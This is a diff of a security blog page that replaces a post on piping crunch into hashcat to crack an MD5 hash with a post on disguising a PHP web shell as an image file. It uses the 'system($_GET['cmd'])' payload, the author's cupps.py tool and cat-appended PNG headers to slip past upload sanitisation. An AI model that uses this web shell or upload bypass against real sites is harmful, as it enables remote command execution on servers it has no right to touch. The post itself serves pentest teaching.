@@ -10,7 +10,7 @@
 
   <title>
     
-      Pipe Brute-force Attack via Password Generator &middot; Saket Upadhyay
+      Custom Signature PHP Payloads &middot; Saket Upadhyay
     
   </title>
 
@@ -289,86 +289,97 @@
 
     <main class="container">
       <header>
-  <h1 class="post-title">Pipe Brute-force Attack via Password Generator</h1>
+  <h1 class="post-title">Custom Signature PHP Payloads</h1>
 </header>
 <div class="content">
   <div class="post-meta">
-  <span class="post-date">27 Jul 2019</span>
+  <span class="post-date">15 Aug 2020</span>
   <span class="post-categories">
-    
-      &bull;
-
-      
-      
-      
-
-      
-        Article
-      
     
   </span>
 </div>
 
 
   <div class="post-body">
-    <div class="message">(Efficient and resource saving trick that was there for decades)</div>
+    <div class="message">
+Easily generating PHP Payloads with Custom file signatures to bypass input sanitisation
+</div>
 
-<p>During password cracking you might decide to brute force a target hash,any service or online website, for that you may need/create heavy dictionaries which can take terabytes of data. But we can skip that step and feed the password directly from generator to brute-force automation software.</p>
+<p><img src="/assets/images/cpngh/h2.png" alt="" /></p>
 
-<h3 id="how-much-an-eight-digit-long-numeric-password-take-on-disk">How much an eight digit long numeric password take on disk?</h3>
+<h3 id="what-is-this">What is this?</h3>
+<p>A tip on bypassing input sanitation by changing payload signature.
+This process is generally done in packet analyser or proxy application like burp but this can be done easily without that.
+We will look into two basic ways to achieve this.</p>
 
-<p>Let’s have a look on most basic and may-be-doesn’t-even-happen-today kind of scenario, creating a 8 digit numerical password with crunch.</p>
+<h3 id="why-this-works">Why this works?</h3>
+<p>PHP generally start interpreting the script whereever <code class="language-plaintext highlighter-rouge">&lt;?php</code> tag starts so anything gibberish preceding that will not be executed and that’s good news for us as we can now append the payload after some file descripters so that meta data of the file will show whatever we want it to show but it will still be a valid PHP script.</p>
 
-<p><img src="https://miro.medium.com/max/1400/1*G9AhPXlIYWLwoJkFD-z6GA.png" alt="Image1.png" />
-858 MB for 8 digit numeric? not too big right, with our 1–2TBs of hard-drives it will do no harm to us.</p>
+<h3 id="methods">Methods</h3>
 
-<p>let’s come to real-life condition now, step-by-step …</p>
+<h4 id="python-script">Python script</h4>
 
-<p>8 letter lowercase alphabets ? …
-<img src="https://miro.medium.com/max/1400/1*HKpP62dqfxk7o_V1W78uYA.png" alt="" />
-1 TB ! just for our new word-list, and to be honest I am writing this from my PC with total storage of 1TB … if i remove all the files and OSes then i may store it, but again i need OS to perform attacks ¯_(ツ)_/¯.</p>
+<p>Don’t worry I have done the hard work for you, you just need to prepare your payload, we will put burden of signature management to script.</p>
 
-<p>and this is last one fulfilling all the basic NEEDS OF MODERN WEBSITES.</p>
+<p>Actually this is small project where I am colleting some of the commonly used file signatures from real files (not the internet and file format wikis) this should give all the payload more convincing results.</p>
 
-<ul>
-  <li>at least one UPPERCASE</li>
-  <li>use of NUMBERS</li>
-  <li>lowecase</li>
-  <li>SPECIAL SYMBOLS</li>
-  <li>Alien species’s language and what ever your PC allows you to throw at login filed!</li>
-</ul>
+<p>You can get the project from GitHub <a href="https://github.com/Saket-Upadhyay/CustomPhpPayloadSignature">HERE</a></p>
 
-<p>CHAR-SET =</p>
+<p><strong><em>With custom python script</em></strong>
+<br />
+As simple as</p>
 
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python cupps.py <span class="nt">-s</span> png
+</code></pre></div></div>
+<p>this will create PHP payload <code class="language-plaintext highlighter-rouge">&lt;?php system($_GET['cmd']);?&gt;</code> with PNG signature. this is one of the commonly  known tricks to bypass most of the basic image upload scenarios.</p>
+
+<p>All the available signatures can be seen by <code class="language-plaintext highlighter-rouge">-h</code> parameter.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python cupps.py <span class="nt">-h</span>
+
+usage: cupps.py <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="o">[</span><span class="nt">-s</span> target_signature]
+
+Script to create PHP Payloads with custom file signatures
+
+optional arguments:
+  <span class="nt">-h</span>, <span class="nt">--help</span>            show this <span class="nb">help </span>message and <span class="nb">exit</span>
+  <span class="nt">-s</span> target_signature, <span class="nt">--signature</span> target_signature
+                        accepted inputs : png,jpg,exe,elf,gif,bmp,jar,pdf,iso
+
+~ with &lt;3 by X64M
+
+</code></pre></div></div>
 <blockquote>
-  <p>0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~
-<img src="https://miro.medium.com/max/1400/1*osEbNjaduUT5-BYTm0FvVQ.png" alt="" />
-now unless you own a data storage farm to store 54303 TB of data, that would be ~ 27150 common 2TB storage drives, so let’s get over this problem by ‘piping’ the output directly to software rather than storing it in the device itself.</p>
+  <p>NOTE: This is active project as of 15-08-2020 and I am trying to add more signatures to it so feel free to contribute.</p>
 </blockquote>
 
-<h3 id="how-to-overcome-this-limitation">How to overcome this limitation?</h3>
+<p><strong><em>By appending output of <code class="language-plaintext highlighter-rouge">cat</code></em></strong></p>
 
-<p>Suppose we want to crack the hash of password <strong>‘17652986’</strong> now md5 of this hash <strong>ce5cff0195a6b059a3241c1b6202ab49</strong> now we can either create a file of 8 digits numbers or can just pass the list from crunch directly to hashcat</p>
+<p>This is one of the neat tricks to achieve this.</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crunch 8 8 123456789| hashcat <span class="nt">-m</span> 0 ce5cff0195a6b059a32411b6202ab49
+<p>just do this :</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>image.png | <span class="nb">head</span> <span class="nt">-n</span> 3 <span class="o">&gt;&gt;</span>exploit.php.png
 </code></pre></div></div>
 
-<p>notice the <strong>‘|’</strong> in the command? this is called <strong>‘pipe’</strong> it will change the standard output of the crunch command to to hashcat and the hashcat when supplied no word-lists, listens on standard input.
-<img src="https://miro.medium.com/max/720/1*9adBjAYUSoDUAIB2TEnPnQ.png" alt="" title="Figure 1" />
-<img src="https://miro.medium.com/max/552/1*_gFnA_SDFEufJ00sdbVo-A.png" alt="" title="Figure 2" /></p>
+<p>this will take the image header and will write to the file <code class="language-plaintext highlighter-rouge">exploit.php.png</code></p>
 
-<p>Flow of data from buffer to brute-force program directly (left figure) — (1)</p>
+<p>and then</p>
 
-<p>Flow of data to hard-disk and then to the program (right figure) — (2)</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>payload.php <span class="o">&gt;&gt;</span>exploit.php.png
+</code></pre></div></div>
+<p>This will append the payload to the file with existing image header.</p>
 
-<p>Here we can already see (1) is much faster and efficient in practice as it does not interact with the hard-disk at all.</p>
+<p><img src="/assets/images/cpngh/bt.png" alt="" /></p>
 
-<p><img src="https://miro.medium.com/max/1400/1*SUUvuNKweFdpjLSMVaabcg.png" alt="" />
-and you can see it took just 31 seconds to crack 8 digit numeric password <em>highlighted</em>, but that’s predictable and speed here was not our concern.</p>
+<p>And that would just do it.</p>
 
 <h3 id="conclusion">Conclusion</h3>
+<p>Well, that’s it for this article. See ya in next one!</p>
 
-<p>So, our motive here is complete as we have saved resources and hacking with all the skills is also all about speed, accuracy and efficiency.</p>
+<p>Till then stay caffenated enough !</p>
+
+<p>–</p>
 
     
 
@@ -377,14 +388,25 @@ and you can see it took just 31 seconds to crack 8 digit numeric password <em>hi
 <div class="post-tags">
   
     
-    <a href="/topics.html#password-cracking">
+    <a href="/topics.html#tool">
     
       <span class="icon">
         <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
     <path d="M0 0h24v24H0z" fill="none"/>
     <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
 </svg>
-      </span>&nbsp;<span class="tag-name">Password Cracking</span>
+      </span>&nbsp;<span class="tag-name">Tool</span>
+    </a>
+  
+    
+    <a href="/topics.html#pentest">
+    
+      <span class="icon">
+        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
+</svg>
+      </span>&nbsp;<span class="tag-name">Pentest</span>
     </a>
   
 </div>
@@ -408,9 +430,9 @@ and you can see it took just 31 seconds to crack 8 digit numeric password <em>hi
   *  https://disqus.com/admin/universalcode/#configuration-variables
   */
   var disqus_config = function () {
-    this.page.url = "http://localhost:4000/article/2019/07/27/Pipe-Brute-force-Attack-via-Password-Generator.html";
+    this.page.url = "http://localhost:4000/2020/08/15/Custom-Signature-PHP-Payloads.html";
     this.page.identifier = "" ||
-                           "http://localhost:4000/article/2019/07/27/Pipe-Brute-force-Attack-via-Password-Generator.html";
+                           "http://localhost:4000/2020/08/15/Custom-Signature-PHP-Payloads.html";
   }
   function loadDisqusComments() { // DON'T EDIT BELOW THIS LINE
     var d = document, s = d.createElement('script');
@@ -443,18 +465,18 @@ and you can see it took just 31 seconds to crack 8 digit numeric password <em>hi
     
       <li>
         <h3>
-          <a href="/2020/08/15/Custom-Signature-PHP-Payloads.html">
-            Custom Signature PHP Payloads
-            <small>15 Aug 2020</small>
+          <a href="/2020/08/10/DDoS-Simulation-in-NS3-C++.html">
+            DDoS attack Simulation in NS3
+            <small>10 Aug 2020</small>
           </a>
         </h3>
       </li>
     
       <li>
         <h3>
-          <a href="/2020/08/10/DDoS-Simulation-in-NS3-C++.html">
-            DDoS attack Simulation in NS3
-            <small>10 Aug 2020</small>
+          <a href="/2020/04/13/CipherCombat2-Shifter2.html">
+            Shifter2 [CipherCombat2.0 CTF write-up]
+            <small>13 Apr 2020</small>
           </a>
         </h3>
       </li>
